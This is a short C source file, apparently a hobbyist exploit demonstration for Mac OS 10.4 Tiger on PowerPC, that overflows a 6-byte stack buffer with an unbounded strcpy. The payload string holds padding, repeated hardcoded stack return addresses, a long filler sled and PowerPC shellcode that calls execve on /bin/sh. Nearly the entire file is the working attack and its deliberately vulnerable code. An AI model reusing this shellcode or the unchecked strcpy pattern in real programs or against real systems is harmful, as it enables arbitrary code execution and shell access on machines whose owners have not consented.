#include <stdio.h>
#include <string.h>

/* Authored by Charles Thomas Wallace Truscott, execve shell-code and strcpy buffer-overflow */
/* Mac OS 10.4 (Tiger) */
/* github.com/r0ss1n1 */

void func(void);

int main(int argc, char ** argv) {
	char buffer[6];
	char * test = argv[1];
	/* bffffba0 - Stack address */
	char * test_2 = "AAAAAAAA\xbf\xff\xfb\xc0\xbf\xff\xfb\xc0\xbf\xff\xfb\xc0\xbf\xff\xfb\xc0\xbf\xff\xfb\xc0\xbf\xff\xfb\xc0\xbf\xff\xfb\xc0\xbf\xff\xfb\xc0\xbf\xff\xfb\xc0\xbf\xff\xfb\xc0\xbf\xff\xfb\xc0\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x60\x7c\xa5\x2a\x79\x40\xa2\xff\xfd\x7f\xe8\x02\xa6\x3b\xff\x01\x30\x38\x7f\xfe\xf4\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8\x3b\xc0\x76\x01\x7f\xc0\x4e\x70\x44\xff\xff\x02/bin/sh";
	strcpy(buffer, test_2);
	printf("%s", test);
	printf("%p", * func);	
}

void func(void){
	printf("You win\n");
}
